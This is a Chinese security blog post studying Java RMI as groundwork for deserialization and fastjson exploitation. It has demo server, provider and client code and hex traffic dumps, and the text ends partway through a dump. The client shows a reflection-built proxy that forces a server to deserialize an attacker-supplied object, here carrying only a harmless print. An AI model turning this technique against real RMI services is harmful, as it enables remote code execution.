<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
  <link rel="mask-icon" href="/images/favicon.ico" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"rmb122.com","root":"/","scheme":"Mist","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="RMI &#x2F; JNDI 在反序列化, fastjson 漏洞利用的时候都经常出现, 学习一下.">
<meta property="og:type" content="article">
<meta property="og:title" content="JAVA JNDI &#x2F; RMI 学习">
<meta property="og:url" content="https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Rmb122&#39;s Notebook">
<meta property="og:description" content="RMI &#x2F; JNDI 在反序列化, fastjson 漏洞利用的时候都经常出现, 学习一下.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2020/02/19/pMiX4BNVRzeadD6.png">
<meta property="og:image" content="https://i.loli.net/2020/02/19/ur2VUMmH5l9IDvz.png">
<meta property="article:published_time" content="2020-02-04T14:39:58.000Z">
<meta property="article:modified_time" content="2020-05-29T04:35:04.112Z">
<meta property="article:author" content="rmb122">
<meta property="article:tag" content="web">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/02/19/pMiX4BNVRzeadD6.png">

<link rel="canonical" href="https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>JAVA JNDI / RMI 学习 | Rmb122's Notebook</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Rmb122's Notebook" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line toggle-line-first"></span>
        <span class="toggle-line toggle-line-middle"></span>
        <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Rmb122's Notebook</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rmb122.com/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="rmb122">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Rmb122's Notebook">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          JAVA JNDI / RMI 学习
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-02-04 22:39:58" itemprop="dateCreated datePublished" datetime="2020-02-04T22:39:58+08:00">2020-02-04</time>
            </span>

          
            <span id="/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/" class="post-meta-item leancloud_visitors" data-flag-title="JAVA JNDI / RMI 学习" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/04/JAVA-JNDI-RMI-%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>RMI / JNDI 在反序列化, fastjson 漏洞利用的时候都经常出现, 学习一下.</p>
<a id="more"></a>

<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>盗一张图  </p>
<p><img src="https://i.loli.net/2020/02/19/pMiX4BNVRzeadD6.png" alt="1.png"></p>
<p>加上一些示例,  </p>
<p>RMIServer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIServiceProvider.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServiceProvider</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line">        TestObjectImpl obj = <span class="keyword">new</span> TestObjectImpl();</span><br><span class="line">        TestObject services = (TestObject) UnicastRemoteObject.exportObject(obj, <span class="number">0</span>);</span><br><span class="line">        registry.bind(<span class="string">"test"</span>, services);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteRef;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        DeserializeObject deserializeObject = <span class="keyword">new</span> DeserializeObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;Class.class, Map.class&#125;);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(<span class="string">"aaa"</span>, deserializeObject);</span><br><span class="line">        InvocationHandler obj = (InvocationHandler) constructor.newInstance(Deprecated.class, hashMap);</span><br><span class="line"></span><br><span class="line">        TestObject services = (TestObject) registry.lookup(<span class="string">"test"</span>);</span><br><span class="line">        CharSequence proxy = (CharSequence) Proxy.newProxyInstance(String.class.getClassLoader(), String.class.getInterfaces(), obj);</span><br><span class="line">        services.callMe(proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TestObject</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">callMe</span><span class="params">(Dummy input)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestObjectImpl</span> <span class="keyword">implements</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callMe</span><span class="params">(Dummy input)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"callMe: "</span> + input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DummyImpl</span> <span class="keyword">implements</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserializeObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">"DeserializeObject.readObject"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下:  </p>
<p>RMIServiceProvider 输出:<br><img src="https://i.loli.net/2020/02/19/ur2VUMmH5l9IDvz.png" alt="2.png"></p>
<p>大致理解起来还是不太困难的, 客户端通过 <code>Registry</code>, 调用 <code>RMIServiceProvider</code> 上的服务.<br>可以看看 wireshark 的流量, 更清晰一些.  </p>
<p>Client &lt;-&gt; Registry 之间的流量, 缩进的是注册局发给客户端的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">00000000  4a 52 4d 49 00 02 4b                               JRMI..K</span><br><span class="line">    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 84 58   N..127.0 .0.1...X</span><br><span class="line">00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....</span><br><span class="line">00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 00 00   P....w&quot;. ........</span><br><span class="line">00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000036  02 44 15 4d c9 d4 e6 3b  df 74 00 04 74 65 73 74   .D.M...; .t..test</span><br><span class="line">    00000010  51 ac ed 00 05 77 0f 01  e8 1f e8 41 00 00 01 70   Q....w.. ...A...p</span><br><span class="line">    00000020  5d a3 bd 51 80 0c 73 7d  00 00 00 01 00 16 64 65   ]..Q..s&#125; ......de</span><br><span class="line">    00000030  6d 6f 2e 72 6d 62 31 32  32 2e 54 65 73 74 4f 62   mo.rmb12 2.TestOb</span><br><span class="line">    00000040  6a 65 63 74 70 78 72 00  17 6a 61 76 61 2e 6c 61   jectpxr. .java.la</span><br><span class="line">    00000050  6e 67 2e 72 65 66 6c 65  63 74 2e 50 72 6f 78 79   ng.refle ct.Proxy</span><br><span class="line">    00000060  e1 27 da 20 cc 10 43 cb  02 00 01 4c 00 01 68 74   .&#39;. ..C. ...L..ht</span><br><span class="line">    00000070  00 25 4c 6a 61 76 61 2f  6c 61 6e 67 2f 72 65 66   .%Ljava&#x2F; lang&#x2F;ref</span><br><span class="line">    00000080  6c 65 63 74 2f 49 6e 76  6f 63 61 74 69 6f 6e 48   lect&#x2F;Inv ocationH</span><br><span class="line">    00000090  61 6e 64 6c 65 72 3b 70  78 70 73 72 00 2d 6a 61   andler;p xpsr.-ja</span><br><span class="line">    000000A0  76 61 2e 72 6d 69 2e 73  65 72 76 65 72 2e 52 65   va.rmi.s erver.Re</span><br><span class="line">    000000B0  6d 6f 74 65 4f 62 6a 65  63 74 49 6e 76 6f 63 61   moteObje ctInvoca</span><br><span class="line">    000000C0  74 69 6f 6e 48 61 6e 64  6c 65 72 00 00 00 00 00   tionHand ler.....</span><br><span class="line">    000000D0  00 00 02 02 00 00 70 78  72 00 1c 6a 61 76 61 2e   ......px r..java.</span><br><span class="line">    000000E0  72 6d 69 2e 73 65 72 76  65 72 2e 52 65 6d 6f 74   rmi.serv er.Remot</span><br><span class="line">    000000F0  65 4f 62 6a 65 63 74 d3  61 b4 91 0c 61 33 1e 03   eObject. a...a3..</span><br><span class="line">    00000100  00 00 70 78 70 77 32 00  0a 55 6e 69 63 61 73 74   ..pxpw2. .Unicast</span><br><span class="line">    00000110  52 65 66 00 09 31 32 37  2e 30 2e 31 2e 31 00 00   Ref..127 .0.1.1..</span><br><span class="line">    00000120  a9 83 27 2e 2f a2 08 49  09 8f ab a0 76 97 00 00   ..&#39;.&#x2F;..I ....v...</span><br><span class="line">    00000130  01 70 5d a6 5c 22 80 01  01 78                     .p].\&quot;.. .x</span><br><span class="line">00000046  52                                                 R</span><br><span class="line">    0000013A  53                                                 S</span><br><span class="line">00000047  54 e8 1f e8 41 00 00 01  70 5d a3 bd 51 80 0c      T...A... p]..Q..</span><br></pre></td></tr></table></figure>

<p>Client &lt;-&gt; RMIServiceProvider 之间的流量, 缩进的是服务提供者发给客户端的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">00000000  4a 52 4d 49 00 02 4b                               JRMI..K</span><br><span class="line">    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 c1 c2   N..127.0 .0.1....</span><br><span class="line">00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....</span><br><span class="line">00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 02 00   P....w&quot;. ........</span><br><span class="line">00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000036  01 f6 b6 89 8d 8b f2 86  43 75 72 00 18 5b 4c 6a   ........ Cur..[Lj</span><br><span class="line">00000046  61 76 61 2e 72 6d 69 2e  73 65 72 76 65 72 2e 4f   ava.rmi. server.O</span><br><span class="line">00000056  62 6a 49 44 3b 87 13 00  b8 d0 2c 64 7e 02 00 00   bjID;... ..,d~...</span><br><span class="line">00000066  70 78 70 00 00 00 01 73  72 00 15 6a 61 76 61 2e   pxp....s r..java.</span><br><span class="line">00000076  72 6d 69 2e 73 65 72 76  65 72 2e 4f 62 6a 49 44   rmi.serv er.ObjID</span><br><span class="line">00000086  a7 5e fa 12 8d dc e5 5c  02 00 02 4a 00 06 6f 62   .^.....\ ...J..ob</span><br><span class="line">00000096  6a 4e 75 6d 4c 00 05 73  70 61 63 65 74 00 15 4c   jNumL..s pacet..L</span><br><span class="line">000000A6  6a 61 76 61 2f 72 6d 69  2f 73 65 72 76 65 72 2f   java&#x2F;rmi &#x2F;server&#x2F;</span><br><span class="line">000000B6  55 49 44 3b 70 78 70 27  2e 2f a2 08 49 09 8f 73   UID;pxp&#39; .&#x2F;..I..s</span><br><span class="line">000000C6  72 00 13 6a 61 76 61 2e  72 6d 69 2e 73 65 72 76   r..java. rmi.serv</span><br><span class="line">000000D6  65 72 2e 55 49 44 0f 12  70 0d bf 36 4f 12 02 00   er.UID.. p..6O...</span><br><span class="line">000000E6  03 53 00 05 63 6f 75 6e  74 4a 00 04 74 69 6d 65   .S..coun tJ..time</span><br><span class="line">000000F6  49 00 06 75 6e 69 71 75 